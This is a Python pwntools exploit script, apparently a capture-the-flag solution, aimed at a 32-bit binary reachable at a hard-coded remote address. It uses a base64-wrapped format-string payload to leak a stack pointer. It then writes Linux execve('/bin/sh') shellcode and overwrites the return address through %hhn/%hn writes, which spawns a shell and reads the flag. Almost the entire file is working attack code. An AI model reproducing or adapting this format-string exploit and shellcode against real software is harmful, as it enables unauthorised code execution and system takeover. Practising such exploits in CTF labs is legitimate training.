#!/usr/bin/env python3
#! -*- coding : utf-8 -*-

import os, sys, base64
from pwn import *
from ctypes import *
from pwnlib.fmtstr import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.aslr = False

target='./4f59876cebb1469ca62254c162306aa5'
use_gdb = False
use_gdb = True
gdb_script='''
b *0x08048B6F
c
'''

def exp(ip = None, port = None):
    global use_gdb
    remote_run = False
    flag = None
    if ip and port:
        p = remote(ip, port)
        use_gdb = False
        remote_run = True
    else:
        p=process(target)

    if use_gdb:
        gdb.attach(p, gdbscript=gdb_script)
        pause()

    payload = base64.b64encode(b'%4$x%12$x%20$xdeadbeef')
    p.sendline(payload)
    addr = p.recvuntil(b'deadbeef')[:-8]
    ebp = int(addr[0:8], 16)

    ret_addr = ebp + 4
    shell_addr = (0xa8a0 - (ret_addr&0xFF)) & 0xFFFF
    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" + \
                b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    payload = shellcode
    if ret_addr&0xFF > 0:
        payload += b'%' + str((ret_addr - len(shellcode))&0xFF).encode() + b'c%4$hhn%' + str(shell_addr).encode() + b'c%12$hn'
    else:
        payload += b'%' + str((ret_addr - len(shellcode))&0xFFFF).encode() + b'c%4$hn%' + str(shell_addr).encode() + b'c%12$hn'

    payload = base64.b64encode(payload)
    p.sendline(payload)
    sleep(2)
    p.recv()
    #p.interactive()
    #p.recvuntil(b'\n')
    if remote_run:
        p.sendline('cat flag')
        flag = p.recvuntil(b'\n')
    else:
        p.interactive()

    log.info(flag)

if __name__ == "__main__":
    ip, port = None, None
    remote_str = None
    remote_str = '220.249.52.133:57787'

    if len(sys.argv) > 1:
        remote_str = sys.argv[1]
    if remote_str:
        ip, port = remote_str.split(":")

    exp(ip, port)
